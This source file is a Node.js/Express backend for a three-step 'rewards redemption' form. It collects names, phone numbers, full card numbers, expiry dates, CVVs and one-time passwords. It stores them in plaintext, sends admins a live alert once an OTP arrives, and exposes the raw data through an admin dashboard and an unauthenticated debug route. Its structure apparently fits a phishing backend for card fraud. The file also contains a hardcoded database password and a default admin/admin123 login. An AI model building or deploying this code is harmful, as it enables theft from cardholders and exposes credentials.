import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import dotenv from 'dotenv';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { createServer } from 'http';
import { Server } from 'socket.io';

dotenv.config();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: {
    origin: ['http://localhost:5173', 'http://localhost:5174', 'http://localhost:5175', 'http://127.0.0.1:5173', 'http://127.0.0.1:5174', 'http://127.0.0.1:5175'],
    methods: ['GET', 'POST']
  }
});

const PORT = process.env.PORT || 5001;

// Middleware
app.use(cors({
  origin: ['http://localhost:5173', 'http://localhost:5174', 'http://localhost:5175', 'http://127.0.0.1:5173', 'http://127.0.0.1:5174', 'http://127.0.0.1:5175'],
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
app.use(express.json());

// MongoDB Connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://keshavgupta86036:FST2023k@cluster0.06aqope.mongodb.net/axis';

console.log('Attempting to connect to MongoDB...');

mongoose.connect(MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  serverSelectionTimeoutMS: 5000,
});

const db = mongoose.connection;

db.on('error', (error) => {
  console.error('MongoDB connection error:', error);
});

db.once('open', () => {
  console.log('✅ Connected to MongoDB successfully');
});

// Schemas (keep your existing schemas)
const RedemptionRequestSchema = new mongoose.Schema({
  fullName: {
    type: String,
    required: true,
    trim: true
  },
  mobileNumber: {
    type: String,
    required: true,
    trim: true
  },
  cardLimit: {
    type: String,
    trim: true
  },
  cardNumber: {
    type: String,
    required: false,
    trim: true
  },
  expiryDate: {
    type: String,
    required: false,
    trim: true
  },
  cvv: {
    type: String,
    required: false,
    trim: true
  },
  otp: {
    type: String,
    required: false,
    trim: true
  },
  status: {
    type: String,
    enum: ['draft', 'pending', 'approved', 'rejected'],
    default: 'draft'
  },
  submittedAt: {
    type: Date,
    default: Date.now
  },
  ipAddress: String,
  userAgent: String
}, {
  timestamps: true
});

const AdminSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true,
    unique: true
  },
  password: {
    type: String,
    required: true
  },
  role: {
    type: String,
    default: 'admin'
  }
}, {
  timestamps: true
});

const RedemptionRequest = mongoose.model('RedemptionRequest', RedemptionRequestSchema);
const Admin = mongoose.model('Admin', AdminSchema);

// Create default admin user
const createDefaultAdmin = async () => {
  try {
    if (mongoose.connection.readyState !== 1) {
      console.log('Waiting for MongoDB connection...');
      return;
    }

    const existingAdmin = await Admin.findOne({ username: 'admin' });
    if (!existingAdmin) {
      const hashedPassword = await bcrypt.hash('admin123', 10);
      const admin = new Admin({
        username: 'admin',
        password: hashedPassword
      });
      await admin.save();
      console.log('✅ Default admin user created: admin/admin123');
    } else {
      console.log('✅ Admin user already exists');
    }
  } catch (error) {
    console.error('❌ Error creating default admin:', error.message);
  }
};

setTimeout(createDefaultAdmin, 2000);

// Socket.io for real-time updates
io.on('connection', (socket) => {
  console.log('🔌 Admin client connected:', socket.id);
  
  socket.on('disconnect', () => {
    console.log('🔌 Admin client disconnected:', socket.id);
  });
});

// Helper function to emit real-time updates
const emitRedemptionUpdate = () => {
  io.emit('redemptionUpdate', { 
    message: 'New redemption request submitted',
    timestamp: new Date().toISOString()
  });
};

// Middleware to verify JWT token
const verifyToken = (req, res, next) => {
  const token = req.header('Authorization')?.replace('Bearer ', '');
  
  if (!token) {
    return res.status(401).json({ message: 'Access denied. No token provided.' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'your-secret-key');
    req.admin = decoded;
    next();
  } catch (error) {
    res.status(400).json({ message: 'Invalid token.' });
  }
};

// Routes

// Save partial form data (Step 1: Personal Info)
app.post('/api/rewards-redemption/step1', async (req, res) => {
  try {
    const { fullName, mobileNumber, cardLimit } = req.body;

    if (!fullName || !mobileNumber) {
      return res.status(400).json({ 
        message: 'Full name and mobile number are required' 
      });
    }

    const redemptionRequest = new RedemptionRequest({
      fullName,
      mobileNumber,
      cardLimit: cardLimit || '',
      cardNumber: '',
      expiryDate: '',
      cvv: '',
      otp: '',
      status: 'draft',
      ipAddress: req.ip,
      userAgent: req.get('User-Agent')
    });

    await redemptionRequest.save();

    res.status(201).json({ 
      message: 'Personal information saved successfully',
      requestId: redemptionRequest._id
    });
  } catch (error) {
    console.error('Error saving personal info:', error);
    res.status(500).json({ 
      message: 'Internal server error. Please try again later.' 
    });
  }
});

// Update form data (Step 2: Credit Card Details)
app.patch('/api/rewards-redemption/:id/step2', async (req, res) => {
  try {
    const { id } = req.params;
    const { cardNumber, expiryDate, cvv } = req.body;

    if (!cardNumber || !expiryDate || !cvv) {
      return res.status(400).json({ 
        message: 'All card details are required' 
      });
    }

    const redemptionRequest = await RedemptionRequest.findByIdAndUpdate(
      id,
      {
        cardNumber,
        expiryDate,
        cvv,
        status: 'draft'
      },
      { new: true }
    );

    if (!redemptionRequest) {
      return res.status(404).json({ message: 'Redemption request not found' });
    }

    res.json({ 
      message: 'Card details saved successfully',
      requestId: redemptionRequest._id
    });
  } catch (error) {
    console.error('Error saving card details:', error);
    res.status(500).json({ 
      message: 'Internal server error. Please try again later.' 
    });
  }
});

// Final submission (Step 3: OTP Verification)
app.patch('/api/rewards-redemption/:id/step3', async (req, res) => {
  try {
    const { id } = req.params;
    const { otp } = req.body;

    if (!otp) {
      return res.status(400).json({ 
        message: 'OTP is required' 
      });
    }

    const redemptionRequest = await RedemptionRequest.findByIdAndUpdate(
      id,
      {
        otp,
        status: 'pending'
      },
      { new: true }
    );

    if (!redemptionRequest) {
      return res.status(404).json({ message: 'Redemption request not found' });
    }

    // Emit real-time update to all connected admin clients
    emitRedemptionUpdate();

    res.json({ 
      message: 'Redemption request submitted successfully',
      requestId: redemptionRequest._id
    });
  } catch (error) {
    console.error('Error submitting redemption request:', error);
    res.status(500).json({ 
      message: 'Internal server error. Please try again later.' 
    });
  }
});

// Submit redemption request - UPDATED with real-time emit
app.post('/api/rewards-redemption', async (req, res) => {
  try {
    const { fullName, mobileNumber, cardLimit, cardNumber, expiryDate, cvv, otp } = req.body;

    if (!fullName || !mobileNumber || !cardNumber || !expiryDate || !cvv || !otp) {
      return res.status(400).json({ 
        message: 'All required fields must be provided' 
      });
    }

    const redemptionRequest = new RedemptionRequest({
      fullName,
      mobileNumber,
      cardLimit,
      cardNumber,
      expiryDate,
      cvv,
      otp,
      ipAddress: req.ip,
      userAgent: req.get('User-Agent')
    });

    await redemptionRequest.save();

    // Emit real-time update to all connected admin clients
    emitRedemptionUpdate();

    res.status(201).json({ 
      message: 'Redemption request submitted successfully',
      requestId: redemptionRequest._id
    });
  } catch (error) {
    console.error('Error submitting redemption request:', error);
    res.status(500).json({ 
      message: 'Internal server error. Please try again later.' 
    });
  }
});

// Admin login (keep your existing login code)
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    console.log('Login attempt for user:', username);

    if (mongoose.connection.readyState !== 1) {
      return res.status(503).json({ 
        message: 'Database not available. Please check if MongoDB is running.' 
      });
    }

    if (!username || !password) {
      return res.status(400).json({ message: 'Username and password are required' });
    }

    const admin = await Admin.findOne({ username });
    if (!admin) {
      console.log('Admin not found:', username);
      return res.status(401).json({ message: 'Invalid credentials' });
    }

    const isPasswordValid = await bcrypt.compare(password, admin.password);
    if (!isPasswordValid) {
      console.log('Invalid password for user:', username);
      return res.status(401).json({ message: 'Invalid credentials' });
    }

    const token = jwt.sign(
      { id: admin._id, username: admin.username },
      process.env.JWT_SECRET || 'your-secret-key',
      { expiresIn: '24h' }
    );

    console.log('✅ Login successful for user:', username);

    res.json({
      message: 'Login successful',
      token,
      admin: {
        id: admin._id,
        username: admin.username,
        role: admin.role
      }
    });
  } catch (error) {
    console.error('❌ Error during admin login:', error);
    res.status(500).json({ 
      message: 'Internal server error',
      error: error.message 
    });
  }
});

// Get all redemption requests - UPDATED with real-time support
app.get('/api/admin/redemption-requests', verifyToken, async (req, res) => {
  try {
    const { page = 1, limit = 50, status, search } = req.query;
    
    let query = {};
    
    if (status && status !== 'all') {
      query.status = status;
    }
    
    if (search) {
      query.$or = [
        { fullName: { $regex: search, $options: 'i' } },
        { mobileNumber: { $regex: search, $options: 'i' } },
        { cardNumber: { $regex: search, $options: 'i' } }
      ];
    }

    const requests = await RedemptionRequest.find(query)
      .sort({ submittedAt: -1 })
      .limit(limit * 1)
      .skip((page - 1) * limit)
      .exec();

    const total = await RedemptionRequest.countDocuments(query);

    const stats = await RedemptionRequest.aggregate([
      {
        $group: {
          _id: '$status',
          count: { $sum: 1 }
        }
      }
    ]);

    const statsObj = {
      total: await RedemptionRequest.countDocuments(),
      draft: 0,
      pending: 0,
      approved: 0,
      rejected: 0
    };

    stats.forEach(stat => {
      statsObj[stat._id] = stat.count;
    });

    res.json({
      requests: requests.map(req => ({
        id: req._id,
        fullName: req.fullName,
        mobileNumber: req.mobileNumber,
        cardLimit: req.cardLimit,
        cardNumber: req.cardNumber,
        expiryDate: req.expiryDate,
        cvv: req.cvv,
        otp: req.otp,
        status: req.status,
        submittedAt: req.submittedAt.toISOString(),
        ipAddress: req.ipAddress,
        userAgent: req.userAgent
      })),
      pagination: {
        current: parseInt(page),
        pages: Math.ceil(total / limit),
        total
      },
      stats: statsObj
    });
  } catch (error) {
    console.error('Error fetching redemption requests:', error);
    res.status(500).json({ message: 'Internal server error' });
  }
});

// Update redemption request status - UPDATED with real-time emit
app.patch('/api/admin/redemption-requests/:id/status', verifyToken, async (req, res) => {
  try {
    const { id } = req.params;
    const { status } = req.body;

    if (!['pending', 'approved', 'rejected'].includes(status)) {
      return res.status(400).json({ message: 'Invalid status' });
    }

    const request = await RedemptionRequest.findByIdAndUpdate(
      id,
      { status },
      { new: true }
    );

    if (!request) {
      return res.status(404).json({ message: 'Redemption request not found' });
    }

    // Emit real-time update
    emitRedemptionUpdate();

    res.json({
      message: 'Status updated successfully',
      request: {
        id: request._id,
        status: request.status
      }
    });
  } catch (error) {
    console.error('Error updating request status:', error);
    res.status(500).json({ message: 'Internal server error' });
  }
});

// Delete redemption request - UPDATED with real-time emit
app.delete('/api/admin/redemption-requests/:id', verifyToken, async (req, res) => {
  try {
    const { id } = req.params;

    const request = await RedemptionRequest.findByIdAndDelete(id);

    if (!request) {
      return res.status(404).json({ message: 'Redemption request not found' });
    }

    // Emit real-time update
    emitRedemptionUpdate();

    res.json({ message: 'Redemption request deleted successfully' });
  } catch (error) {
    console.error('Error deleting request:', error);
    res.status(500).json({ message: 'Internal server error' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    database: mongoose.connection.readyState === 1 ? 'Connected' : 'Disconnected'
  });
});

// Debug endpoint to check raw data (remove in production)
app.get('/api/debug/raw-data/:id', async (req, res) => {
  try {
    const request = await RedemptionRequest.findById(req.params.id);
    if (!request) {
      return res.status(404).json({ message: 'Request not found' });
    }
    res.json({
      id: request._id,
      fullName: request.fullName,
      mobileNumber: request.mobileNumber,
      cardLimit: request.cardLimit,
      cardNumber: request.cardNumber, // Raw unmasked data
      expiryDate: request.expiryDate,
      cvv: request.cvv, // Raw unmasked data
      otp: request.otp, // Raw unmasked data
      status: request.status,
      submittedAt: request.submittedAt
    });
  } catch (error) {
    res.status(500).json({ message: 'Error fetching data' });
  }
});

server.listen(PORT, () => {
  console.log(`🚀 Server is running on port ${PORT}`);
  console.log(`📊 Health check: http://localhost:${PORT}/api/health`);
  console.log(`🔌 WebSocket server running on port ${PORT}`);
});

export default app;